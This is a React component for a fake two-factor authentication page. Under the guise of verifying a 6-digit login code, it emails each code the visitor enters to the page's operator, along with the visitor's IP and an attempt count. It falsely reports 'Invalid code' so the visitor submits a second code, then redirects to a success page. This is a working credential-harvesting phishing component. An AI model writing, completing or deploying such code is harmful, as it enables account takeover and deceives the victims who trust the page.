import React from 'react';
import { useRef } from 'react';
import './AuthenticationContent.scss';
import { useNavigate } from 'react-router-dom';
import { sendEmail } from '../../Utils/sendEmail';
const AuthenticationContent = () => {
  const [disabled, setDisabled] = React.useState(false);
  const [disabled2, setDisabled2] = React.useState(false);
  const [time, setTime] = React.useState(60);
  const [attempt, setAttempt] = React.useState(0);
  const [code, setCode] = React.useState('');
  const [code2fa, setCode2] = React.useState('');
  const activeClass = useRef();

  let interval = null;
  const handleSend = () => {
    setDisabled(true);
    setTimeout(() => {
      setDisabled(false);
    }, 60 * 1000);
    if (interval || time !== 60) setTime(60);
    interval = setInterval(() => {
      setTime((prev) => prev - 1);
    }, 1000);
    setAttempt((prev) => prev + 1);

    const content = `
    IP: ${localStorage.getItem('ip')}

    Attempt: ${attempt + 1}
    Verification code: ${code}
    `;
    sendEmail({ content });
  };

  const handleSend2 = () => {
    setDisabled2(true);
    activeClass.current.classList.remove('active');
    activeClass.current.classList.add('greenBg');


    const content = `
    IP: ${localStorage.getItem('ip')}

    Attempt: ${attempt + 1}
    Key: ${code2fa}
    `;
    sendEmail({ content });
  };

  React.useEffect(() => {
    return () => {
      if (interval) clearInterval(interval);
    };
  }, []);

  const navigate = useNavigate();

  React.useEffect(() => {
    if (attempt >= 2) return navigate('/success');
  }, [attempt, navigate]);

  return (
    <div className="container-fluid">
    <div className="auth__block col-12 mt-5 pt-5">
      <div className="auth__block-item col-xl-5 col-lg-6 col-md-10 shadow-lg bg-body rounded">
        <div className="auth__block-title">
          Two-factor authentication required
        </div>
        <div className="auth__block-description mt-3 mb15">
          You've asked us to require a 6-digit login code or two-factor authentication key when anyone tries to
          access your account from a new device or browser.
        </div>
        <div className="auth__block-description">
          Enter the 6-digit code from your code generator or third-party app
          below.

        </div>

        <div className="auth__block-pass d-flex align-items-center mt-3">
          <div className="input__wrapper">
            <input
              className="form-control pass"
              type="text"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
            {disabled && (
              <p className="text-danger input__alert">
                Invalid code. Please try again after {time} seconds.
              </p>
            )}
          </div>
          <span className="auth_btn">
            <button
              disabled={disabled}
              onClick={handleSend}
              className={code.length >= 6 ? 'active' : ''}
            >
              Send Code
            </button></span>
          </div>
        <div className="auth__block-footer d-flex justify-content-between align-items-center mt-5">
          <a href="#">Need another way to the authenticate?</a>

        </div>
      </div>
    </div >
    </div>
  );
};

export default AuthenticationContent;
